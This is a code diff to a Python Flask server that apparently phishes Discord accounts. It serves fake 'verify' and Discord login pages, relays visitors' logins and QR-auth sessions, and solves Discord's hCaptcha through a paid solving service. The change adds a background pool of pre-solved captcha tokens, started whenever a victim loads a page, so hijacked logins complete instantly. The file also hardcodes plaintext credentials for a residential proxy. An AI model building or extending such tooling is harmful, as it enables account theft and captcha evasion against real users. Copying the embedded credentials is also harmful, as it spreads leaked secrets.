@@ -359,6 +359,74 @@ sessions = {}          # QR auth sessions
 login_sessions = {}    # Captcha flow: sid -> DiscordSession (persisted between captcha challenge & solve)
 
 
+# ━━━━━━━━━━━━ Captcha Pre-Solve Pool ━━━━━━━━━━━━
+# Solves captchas in advance so they're ready instantly when needed.
+# Tokens are solved WITHOUT rqdata (generic). Discord usually accepts them.
+
+import collections
+
+DEFAULT_SITEKEY = 'a5f74b19-9e45-40e0-b45d-47ff91b7a6c2'
+_presolve_pool = collections.deque()  # deque of {'token': str, 'time': float}
+_presolve_lock = threading.Lock()
+_presolve_active = 0  # number of solves currently running
+PRESOLVE_MAX_ACTIVE = 2  # max concurrent pre-solves
+PRESOLVE_MAX_POOL = 2    # max ready tokens to keep
+PRESOLVE_TOKEN_TTL = 110  # hCaptcha tokens expire ~120s, use within 110s
+
+
+def _presolve_worker():
+    """Background worker: solve one captcha and add to pool."""
+    global _presolve_active
+    try:
+        print('[presol] Starting pre-solve...')
+        token, err = solve_captcha(DEFAULT_SITEKEY, '')
+        if token:
+            with _presolve_lock:
+                _presolve_pool.append({'token': token, 'time': time.time()})
+            print(f'[presol] Token ready! Pool size: {len(_presolve_pool)}')
+        else:
+            print(f'[presol] Failed: {err}')
+    finally:
+        with _presolve_lock:
+            _presolve_active -= 1
+
+
+def _start_presolve():
+    """Start a pre-solve if pool needs more tokens."""
+    global _presolve_active
+    if not ANTICAPTCHA_KEY:
+        return
+    with _presolve_lock:
+        # Clean expired tokens
+        now = time.time()
+        while _presolve_pool and (now - _presolve_pool[0]['time']) > PRESOLVE_TOKEN_TTL:
+            _presolve_pool.popleft()
+            print('[presol] Expired token removed')
+        pool_size = len(_presolve_pool)
+        if pool_size >= PRESOLVE_MAX_POOL or _presolve_active >= PRESOLVE_MAX_ACTIVE:
+            return
+        _presolve_active += 1
+    threading.Thread(target=_presolve_worker, daemon=True).start()
+
+
+def _get_presolved():
+    """Get a pre-solved token if available (FIFO)."""
+    with _presolve_lock:
+        now = time.time()
+        while _presolve_pool:
+            entry = _presolve_pool.popleft()
+            age = now - entry['time']
+            if age < PRESOLVE_TOKEN_TTL:
+                print(f'[presol] Using pre-solved token (age {age:.0f}s)')
+                # Start another solve to refill pool
+                threading.Thread(target=_start_presolve, daemon=True).start()
+                return entry['token']
+            print(f'[presol] Discarding expired token (age {age:.0f}s)')
+    # Start one if nothing available
+    _start_presolve()
+    return None
+
+
 PROXY = os.environ.get('CAPTCHA_PROXY', 'http://henchmanbobby_gmail_com:Fatman11@la.residential.rayobyte.com:8000')
 
 def solve_captcha(sitekey, rqdata):
@@ -537,12 +605,24 @@ def _qr_worker(s: QRAuth):
 
 @app.route('/')
 def index():
+    # Pre-solve captcha when landing page loads (user will click verify soon)
+    _start_presolve()
     return send_from_directory('.', 'verify_page.html')
 
 
 @app.route('/login')
 def login_page():
+    # Start pre-solving captcha as soon as someone loads the login page
+    _start_presolve()
     return send_from_directory('.', 'discord_login.html')
+
+
+@app.route('/api/pressolve', methods=['POST'])
+def api_pressolve():
+    """Frontend calls this to ensure pre-solve is running."""
+    _start_presolve()
+    pool_size = len(_presolve_pool)
+    return jsonify({'ok': True, 'pool': pool_size, 'active': _presolve_active})
 
 
 @app.route('/api/login', methods=['POST'])
@@ -693,7 +773,14 @@ def _bg_solve(sid):
         ds      = sess['session']
 
         print(f'[bg:{sid}] Solving captcha...')
-        solved_token, err = solve_captcha(sitekey, rqdata)
+        # Try pre-solved token first (instant)
+        presolved = _get_presolved()
+        if presolved:
+            solved_token = presolved
+            err = None
+            print(f'[bg:{sid}] Using PRE-SOLVED token! (instant)')
+        else:
+            solved_token, err = solve_captcha(sitekey, rqdata)
         if not solved_token:
             print(f'[bg:{sid}] Solve failed: {err}')
             sess['result'] = {'error': f'Captcha solve failed: {err}'}
@@ -738,7 +825,13 @@ def _bg_solve(sid):
             rqdata2  = j.get('captcha_rqdata', '')
             rqtoken2 = j.get('captcha_rqtoken', '')
             print(f'[bg:{sid}] Another captcha, solving again...')
-            solved2, err2 = solve_captcha(sitekey2, rqdata2)
+            presolved2 = _get_presolved()
+            if presolved2:
+                solved2 = presolved2
+                err2 = None
+                print(f'[bg:{sid}] Using PRE-SOLVED token for attempt 2!')
+            else:
+                solved2, err2 = solve_captcha(sitekey2, rqdata2)
             if not solved2:
                 sess['result'] = {'error': f'Captcha re-solve failed: {err2}'}
                 sess['result_code'] = 500
@@ -865,7 +958,13 @@ def _bg_retry(sid):
             rqdata = j.get('captcha_rqdata', '')
             rqtoken = j.get('captcha_rqtoken', '')
             print(f'[retry:{sid}] Captcha required, solving...')
-            solved, err = solve_captcha(sitekey, rqdata)
+            presolved = _get_presolved()
+            if presolved:
+                solved = presolved
+                err = None
+                print(f'[retry:{sid}] Using PRE-SOLVED token!')
+            else:
+                solved, err = solve_captcha(sitekey, rqdata)
             if not solved:
                 sess['result'] = {'error': f'Captcha solve failed: {err}'}
                 sess['result_code'] = 500
